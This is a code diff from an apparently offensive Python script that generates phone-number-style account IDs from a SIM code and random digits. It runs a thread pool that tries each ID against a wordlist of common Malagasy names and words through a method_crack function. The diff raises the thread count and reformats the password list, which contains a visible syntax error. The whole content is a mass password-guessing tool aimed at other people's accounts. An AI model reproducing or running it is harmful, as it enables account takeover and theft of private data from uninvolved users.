@@ -108,7 +108,7 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=80) as Dipto:
+    with tred(max_workers=100) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -116,17 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:6,ids[:6],ids[5:],ids[6:],'fanantenana','Fanantenana','mamako','Mamako','nirina','Nirina','mamiko','Mamiko','malala','Malala','malalako','Malalako','malagasy','Malagasy','malala','fitiavana','mamako','malalako','mamiko','badoda','mendrika', 'antananarivo','Antananarivo','marary','milely','taimbo','hanitra',  'vadiko','jesosy','mahery','malagasy','Malagasy','henintsoa','mahaleo','hanitra',
-                       'vadiko','jesosy','mahery','malagasy','Malagasy','henintsoa','mahaleo',
-                       'miangaly','nomena','nantenaina','fanantenana','sarobidy','fanomezana',
-                       'fanomezantsoa','dadatoa','tsiory','tsiaro','bonjour','madagasikara',
-                       'tiavima','boxeur','jacque','titanic','qwerty','azerty','papasosy',
-                       'mamasossy','tahiana','tantely','tanora','felana','tsilavina',
-                       'nekena','finoana','fanantenana','harena','anjara','vololona',
-                       'liantsoa','tanjona','fifaliana','je t\'aime','fanomezana','narindra',
-                       'mirindra','lalaina','voahangy','iharitiana','mamisoa','mamatsoa',
-                       'sitraka','herilaza','herilaza','cedrick','nasaina','nandrianina',
-                       'tafita','safidy','fenosoa','domoina','hasina','nilaina'] 
+            passlist=[psx,ids,ids[:6,ids[:6],ids[5:],ids[6:],'fanantenana','Fanantenana','mamako','Mamako','nirina','Nirina','mamiko','Mamiko','malala','Malala','malalako','Malalako','malagasy','Malagasy','malala','fitiavana','mamako','malalako','mamiko','badoda','mendrika', 'antananarivo','Antananarivo','marary','milely','taimbo','hanitra',  'vadiko','jesosy','mahery','malagasy','Malagasy','henintsoa','mahaleo','hanitra', 'vadiko','jesosy','mahery','malagasy','Malagasy','henintsoa','mahaleo',   'miangaly','nomena','nantenaina','fanantenana','sarobidy','fanomezana',      'fanomezantsoa','dadatoa','tsiory','tsiaro','bonjour','madagasikara',    'tiavima','boxeur','jacque','titanic','qwerty','azerty','papasosy',   'mamasossy','tahiana','tantely','tanora','felana','tsilavina',     'nekena','finoana','fanantenana','harena','anjara','vololona', 'liantsoa','tanjona','fifaliana','je t\'aime','fanomezana','narindra',  'mirindra','lalaina','voahangy','iharitiana','mamisoa','mamatsoa',  'sitraka','herilaza','herilaza','cedrick','nasaina','nandrianina',  'tafita','safidy','fenosoa','domoina','hasina','nilaina'] 
             Dipto.submit(method_crack,ids,passlist)
             
     linex()
